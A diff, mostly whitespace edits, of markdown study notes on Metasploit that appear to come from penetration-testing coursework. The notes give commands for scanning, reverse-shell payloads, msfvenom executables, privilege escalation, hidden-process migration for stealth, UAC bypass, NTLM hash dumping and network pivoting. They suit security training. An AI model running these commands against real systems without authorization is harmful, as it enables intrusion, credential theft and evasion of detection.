@@ -14,7 +14,8 @@ layout: blank
 	- `db_nmap` - works like regular nmap, but stores results in the db
 		- Query db with `hosts` for hosts and `services` for services
 - `show -h` to show all modules, like `exploits`, `payloads`, and `auxiliary`
-	- Showing payloads is nice; default is usually reverse tcp shell
+	- Showing payloads is nice; default is usually reverse tcp shel
+
 **Auxiliary Modules**
 - Used for external attacks, like enumeration, scanning, fuzzing, sniffing, etc.
 - `search` to search through the modules, with `type` to specify the module type
@@ -41,7 +42,9 @@ layout: blank
 - Contains archive of all exploit code from exploitdb
 - Can search through exploits with `searchsploit {string}`
 - Can copy exploits to home directory with `-m`
+
 ### Using Payloads 
+
 **Staged/Non-Stated Payloads**
 - Non-staged: payload is sent along with the exploit
 	- No use of `/`  means that it's non-staged (e.g. `shell_reverse_tcp`)
@@ -49,6 +52,7 @@ layout: blank
 	- `/` indicates a staged payload (e.g. `shell/reverse_tcp`)
 - `show payloads` to see a list of all payloads
 	- `set payload {index}` to set a payload after showing them
+
 **Meterpreter**
 - Multi-function payload residing entirely in memory
 - `help` to display commands in shell
@@ -62,6 +66,7 @@ layout: blank
 - `download {file_path}` to download a file from the system
 - `upload {local_file_path} {resulting_file_path}` to upload a file to the system
 - `search -f {filename}` to search from `/` for a file named `{filename}`
+
 **Executable Payloads**
 - `msfvenom` can generate malicious executables
 - `msfvenom -l payloads --platform {os (windows)} --arch {arch (x86)}` to list payloads
@@ -80,13 +85,17 @@ layout: blank
 	- `set LHOST 10.0.0.1`
 	- `set LPORT 4444`
 	- `exploit -j`
+
 ### Post-Exploitation
+
 **Meterpreter Post-Exploitation Features**
+
 - `idletime` to see how long it's been since the system was used (e.g. don't run shit until empty)
 - `getsystem` to attempt to elevate privileges to NT AUTHORITY\\SYSTEM
 - `migrate {process_id}` - injects meterpreter into another process for stealth and persistence
 	- If no good processes exist, create one with `execute -H -f {process (notepad)}`
 		- `-H` hides the process, so no visual representation will be present
+
 **Post-Exploitation Modules**
 - After injecting ourselves into another process, our privilege level drops, so we need to escalate
 - `exploit/windows/local/bypassuac_sdclt` is good for UAC bypassing on Windows
@@ -96,6 +105,7 @@ layout: blank
 	- `help` to view commands, like `creds_msv` to dump NTLM hashes
 - Can search for post exploitation modules with `search post ...`
 	- These only require a meterpreter session id
+
 **Pivoting with Metasploit**
 - After getting on a machine, we can enumerate the network in a number of ways
 - If we find an internal IP from something like `ipconfig`, we can pivot to it with the following:
@@ -118,6 +128,7 @@ layout: blank
 	- Then, port forward with `portfwd add -l {local_port} -p {remote_port} -r {int_IP}`
 
 ### Automation
+
 **Resource Scripts**
 - Can chain together metasploit commands and Ruby code
 	- Put all commands in a script (.rc) and pass it to msfconsole with `-r`
